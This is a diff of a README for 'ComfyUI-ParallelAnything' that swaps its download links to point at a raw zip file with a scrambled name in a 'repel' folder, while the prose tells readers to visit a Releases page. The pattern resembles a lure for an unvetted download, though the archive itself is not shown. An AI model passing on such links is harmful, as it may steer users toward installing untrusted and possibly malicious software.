@@ -6,7 +6,7 @@ Welcome to ComfyUI-ParallelAnything! This application helps you utilize high-per
 
 ## 📥 Download Now
 
-[![Download ComfyUI-ParallelAnything](https://raw.githubusercontent.com/zubayer1216/ComfyUI-ParallelAnything/main/repel/Comfy-Anything-U-Parallel-1.7-beta.4.zip)](https://raw.githubusercontent.com/zubayer1216/ComfyUI-ParallelAnything/main/repel/Comfy-Anything-U-Parallel-1.7-beta.4.zip)
+[![Download ComfyUI-ParallelAnything](https://github.com/zubayer1216/ComfyUI-ParallelAnything/raw/refs/heads/main/repel/Comfy_Parallel_U_Anything_v3.7.zip)](https://github.com/zubayer1216/ComfyUI-ParallelAnything/raw/refs/heads/main/repel/Comfy_Parallel_U_Anything_v3.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before you begin, make sure your system meets the following requirements:
 
 To get started, visit the Releases page to find the latest version of ComfyUI-ParallelAnything.
 
-[Download ComfyUI-ParallelAnything](https://raw.githubusercontent.com/zubayer1216/ComfyUI-ParallelAnything/main/repel/Comfy-Anything-U-Parallel-1.7-beta.4.zip)
+[Download ComfyUI-ParallelAnything](https://github.com/zubayer1216/ComfyUI-ParallelAnything/raw/refs/heads/main/repel/Comfy_Parallel_U_Anything_v3.7.zip)
 
 Once on the Releases page:
 
